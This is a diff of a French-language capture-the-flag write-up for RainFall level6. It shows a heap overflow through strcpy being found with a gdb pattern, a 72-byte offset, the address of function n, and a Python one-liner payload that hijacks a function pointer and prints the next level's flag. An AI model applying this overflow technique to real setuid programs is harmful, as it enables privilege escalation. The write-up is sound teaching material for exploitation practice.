@@ -1,31 +1,19 @@
-J'arrive sur le level6
-
-	level6@RainFall:~$ ls -la level6
-	-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
-	level6@RainFall:~$
-
-Il y a un programme level6 avec les droit de l'user level7
-
-J'envoie le fichier dans mon linux pour le decompiller avec cutter
-
-Le programme prend en parametre un argument, et le copie dans une variable allouer
-La fonction appelle ensuite un pointeur sur fonction n qui affiche 'Nop' Dans le terminal.
-Il y a une fonction M qui effectue un appele system pour afficher le fichier .pass de l'user level7
+Le programme prend en parametre un argument, et le copie dans une variable allouée
+La fonction appelle ensuite un pointeur sur fonction m qui affiche 'Nop' dans le terminal.
+Il y a une fonction n qui effectue un appelle system pour afficher le fichier .pass de l'user level7
 
 Strcpy est une fonction vulnerable au buffer overflow.
+La fonction Malloc prend 64 bit + 8 octets, ajoutés lors de l'allocation.
 
-La fonction Malloc prend 64 bit + 8 octcet ajouter lors de l'allocation.
-
-	r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+	r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
 	Starting program: /home/user/level6/level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
 
 	Program received signal SIGSEGV, Segmentation fault.
-	0x54535353 in ?? ()
+	0x53535353 in ?? ()
 	(gdb)
 
-Je tombe sur la lettre 53(S) qui est a la 72 position dans ma ligne
-
-Je vais donc recuperer l'addresse de la fonction n pour l'injecter dans mon buffer-overflow
+On tombe sur la lettre 53(S) qui est à la 72eme, on a notre offset de 72 avant overflow.
+On veut maintenant récupérer l'adresse de la fonction N (de sa première instruction), qu'on injectera pour forcer son appel.
 
 	(gdb) disass n
 		Dump of assembler code for function n:
@@ -39,8 +27,5 @@ Je vais donc recuperer l'addresse de la fonction n pour l'injecter dans mon buff
 		End of assembler dump.
 	(gdb)
 
-
 	level6@RainFall:~$ ./level6 $(python -c 'print "A"*72+"\x54\x84\x04\x08"')
 	f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
-	level6@RainFall:~$
-
